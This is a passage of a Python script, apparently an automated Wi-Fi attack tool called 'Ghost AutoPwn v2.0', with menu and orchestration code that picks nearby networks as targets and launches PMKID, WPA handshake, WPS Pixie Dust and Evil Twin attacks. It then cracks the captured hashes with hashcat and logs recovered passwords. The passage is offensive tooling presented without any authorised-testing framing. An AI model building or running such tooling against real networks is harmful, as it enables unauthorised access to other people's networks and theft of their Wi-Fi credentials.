            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Attack Type: {attack_type}\n\n")

            f.write(f"Target Information:\n")
            f.write(f"  ESSID: {target['essid']}\n")
            f.write(f"  BSSID: {target['bssid']}\n")
            f.write(f"  Channel: {target['channel']}\n")
            f.write(f"  Encryption: {target['encryption']}\n")
            f.write(f"  Signal: {target['power']} dBm\n\n")

            if capture_file:
                f.write(f"Capture File: {capture_file}\n")

            if password:
                f.write(f"\n{'='*60}\n")
                f.write(f"PASSWORD CRACKED: {password}\n")
                f.write(f"{'='*60}\n")

        self.log(f"Results saved: {result_file.name}", "SUCCESS")

        # Also save to main log
        log_file = self.capture_dir / 'attack_log.txt'
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
            f.write(f"{attack_type} | {target['essid']} ({target['bssid']}) | ")
            if password:
                f.write(f"SUCCESS: {password}\n")
            else:
                f.write(f"No password\n")

    def auto_attack(self, target):
        """Automated attack - Try all methods"""
        print(f"\n{C.PH}{C.B}{'═'*60}")
        print(f"🤖 AUTOMATED ATTACK MODE")
        print(f"{'═'*60}{C.R}\n")

        self.log(f"Auto-attacking {target['essid']}...", "ATTACK")
        print(f"{C.GO}Will try: PMKID → Handshake → WPS{C.R}\n")

        results = []

        # Try PMKID first (fastest, no clients needed)
        self.log("Method 1: PMKID Attack", "ATTACK")
        hash_file = self.attack_pmkid(target)

        if hash_file:
            self.log("PMKID capture successful - attempting crack", "SUCCESS")
            password = self.crack_with_hashcat(hash_file, target)

            if password:
                self.save_result(target, 'PMKID-AUTO', hash_file, password)
                self.log(f"AUTO ATTACK SUCCESS! Password: {password}", "SUCCESS")
                return

            results.append(('PMKID', 'Captured but not cracked'))
        else:
            results.append(('PMKID', 'Failed'))

        # Try Handshake
        self.log("Method 2: Handshake Capture", "ATTACK")
        cap_file = self.attack_handshake(target)

        if cap_file:
            hash_file = self.convert_to_hashcat(cap_file, target)

            if hash_file:
                self.log("Handshake captured - attempting crack", "SUCCESS")
                password = self.crack_with_hashcat(hash_file, target)

                if password:
                    self.save_result(target, 'Handshake-AUTO', cap_file, password)
                    self.log(f"AUTO ATTACK SUCCESS! Password: {password}", "SUCCESS")
                    return

                results.append(('Handshake', 'Captured but not cracked'))
            else:
                results.append(('Handshake', 'Failed'))
        else:
            results.append(('Handshake', 'Failed'))

        # Try WPS if available
        self.log("Method 3: WPS Pixie Dust", "ATTACK")
        wps_result = self.attack_wps(target)

        if wps_result and 'password' in wps_result:
            password = wps_result['password']
            self.save_result(target, 'WPS-AUTO', None, password)
            self.log(f"AUTO ATTACK SUCCESS! Password: {password}", "SUCCESS")
            return
        else:
            results.append(('WPS', 'Failed'))

        # Summary
        print(f"\n{C.BL}{'═'*60}")
        print(f"AUTO ATTACK SUMMARY")
        print(f"{'═'*60}{C.R}\n")

        for method, result in results:
            print(f"  {method}: {result}")

        print(f"\n{C.GO}No password cracked automatically{C.R}")
        print(f"{C.GO}Try manual cracking with different wordlists{C.R}\n")

    def show_statistics(self):
        """Show real-time statistics and graphs"""
        print(f"\n{C.CY}{C.B}{'═'*70}")
        print(f"{'📊 SESSION STATISTICS':^70}")
        print(f"{'═'*70}{C.R}\n")

        # Session stats
        print(f"{C.TX}Session Stats:{C.R}")
        print(f"  Networks Found: {C.B}{self.stats['networks_found']}{C.R}")
        print(f"  Clients Found: {C.B}{self.stats['clients_found']}{C.R}")
        print(f"  Attacks Launched: {C.B}{self.stats['attacks_launched']}{C.R}")
        print(f"  Passwords Cracked: {C.B}{self.stats['passwords_cracked']}{C.R}\n")

        # Signal strength graph
        if self.networks:
            print(f"{C.PH}📡 Signal Strength Graph:{C.R}\n")

            # Sort by power
            sorted_nets = sorted(
                self.networks[:10],  # Top 10
                key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else -100,
                reverse=True
            )

            max_name_len = 20

            for net in sorted_nets:
                essid = net['essid'][:max_name_len].ljust(max_name_len)
                power = int(net['power']) if net['power'].lstrip('-').isdigit() else -100

                # Calculate bar length (scale: -100 to -30)
                bar_len = max(0, min(50, int((power + 100) * 50 / 70)))

                # Color based on strength
                if power > -50:
                    color = C.TX
                elif power > -70:
                    color = C.GO
                else:
                    color = C.GH

                bar = '█' * bar_len + '░' * (50 - bar_len)

                print(f"  {essid} {color}{bar}{C.R} {power} dBm")

            print()

        # Client activity graph
        if self.clients:
            print(f"{C.PH}👥 Client Activity:{C.R}\n")

            # Get APs with most clients
            ap_clients = [(bssid, len(clients)) for bssid, clients in self.clients.items()]
            ap_clients.sort(key=lambda x: x[1], reverse=True)

            for bssid, count in ap_clients[:10]:
                # Find network name
                essid = "Unknown"
                for net in self.networks:
                    if net['bssid'] == bssid:
                        essid = net['essid'][:20].ljust(20)
                        break

                bar_len = min(50, count * 5)
                bar = '▓' * bar_len

                print(f"  {essid} {C.NE}{bar}{C.R} {count} clients")

            print()

        # Encryption types
        if self.networks:
            print(f"{C.PH}🔐 Encryption Types:{C.R}\n")

            enc_types = {}
            for net in self.networks:
                enc = net['encryption'].split()[0] if net['encryption'] else 'Unknown'
                enc_types[enc] = enc_types.get(enc, 0) + 1

            for enc, count in sorted(enc_types.items(), key=lambda x: x[1], reverse=True):
                pct = (count / len(self.networks)) * 100
                bar_len = int(pct / 2)
                bar = '■' * bar_len

                print(f"  {enc:<15} {C.TX}{bar}{C.R} {count} ({pct:.1f}%)")

            print()

        input(f"{C.NE}Press Enter to continue...{C.R}")

    def cleanup(self):
        """Cleanup"""
        self.debug("Cleaning up...")

        # Kill processes
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except:
                try:
                    proc.kill()
                except:
                    pass

        # Disable monitor
        if self.monitor_interface:
            self.log("Disabling monitor mode...", "INFO")
            self.run(['airmon-ng', 'stop', self.monitor_interface], show=False)

            # Restart NetworkManager
            self.run(['systemctl', 'start', 'NetworkManager'], show=False)

    def interactive_menu(self):
        """Main menu"""
        banner()

        if not self.check_root():
            return

        if not self.check_deps():
            return

        if not self.select_interface():
            return

        if not self.enable_monitor():
            return

        try:
            while True:
                # Scan
                if not self.scan_networks(duration=20):
                    retry = input(f"\n{C.GO}Retry scan? (y/n): {C.R}").strip()
                    if retry.lower() != 'y':
                        break
                    continue

                # Select target
                target = self.select_target()

                if target is None:
                    break
                elif target == 'rescan':
                    continue

                # Show target details
                print(f"\n{C.PH}{'═'*60}")
                print(f"🎯 TARGET: {target['essid']}")
                print(f"{'═'*60}{C.R}\n")
                print(f"  BSSID: {target['bssid']}")
                print(f"  Channel: {target['channel']}")
                print(f"  Encryption: {target['encryption']}")
                print(f"  Power: {target['power']} dBm")
                print(f"  Clients: {len(self.clients.get(target['bssid'], []))}\n")

                # Attack menu
                print(f"{C.TX}Attack options:{C.R}")
                print(f"  [1] 🎯 PMKID (No clients needed)")
                print(f"  [2] 🤝 WPA Handshake (Traditional)")
                print(f"  [3] 🔓 WPS Pixie Dust")
                print(f"  [4] 👤 Evil Twin (Captive Portal)")
                print(f"  [5] 🤖 AUTO (Try all attacks)")
                print(f"  [6] 📊 Show Statistics")
                print(f"  [7] ⏭️  Skip\n")

                attack = input(f"{C.NE}Choose attack [1-7]: {C.R}").strip()

                hash_file = None
                cap_file = None
                password = None

                # Execute attacks
                if attack == '1':
                    # PMKID
                    hash_file = self.attack_pmkid(target)

                    if hash_file:
                        # Try to crack
                        crack = input(f"\n{C.NE}Crack with hashcat? (y/n): {C.R}").strip()
                        if crack.lower() == 'y':
                            password = self.crack_with_hashcat(hash_file, target)

                        # Save results
                        self.save_result(target, 'PMKID', hash_file, password)

                elif attack == '2':
                    # Handshake
                    cap_file = self.attack_handshake(target)

                    if cap_file:
                        # Convert to hashcat format
                        hash_file = self.convert_to_hashcat(cap_file, target)

                        if hash_file:
                            # Try to crack
                            crack = input(f"\n{C.NE}Crack with hashcat? (y/n): {C.R}").strip()
                            if crack.lower() == 'y':
                                password = self.crack_with_hashcat(hash_file, target)

                        # Save results
                        self.save_result(target, 'Handshake', cap_file, password)

                elif attack == '3':
                    # WPS
                    result = self.attack_wps(target)

                    if result and 'password' in result:
                        password = result['password']
                        self.save_result(target, 'WPS', None, password)

                elif attack == '4':
                    # Evil Twin
                    self.attack_evil_twin(target)

                elif attack == '5':
                    # AUTO - Try all attacks
                    self.auto_attack(target)

                elif attack == '6':
                    # Statistics
                    self.show_statistics()
                    continue

                else:
                    continue

                another = input(f"\n{C.NE}Attack another target? (y/n): {C.R}").strip()
                if another.lower() != 'y':
                    break

        finally:
            self.cleanup()


def main():
    parser = argparse.ArgumentParser(description='👻 Ghost AutoPwn v2.0')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    ghost = GhostWiFi(verbose=args.verbose)
    ghost.interactive_menu()


if __name__ == '__main__':
    main()
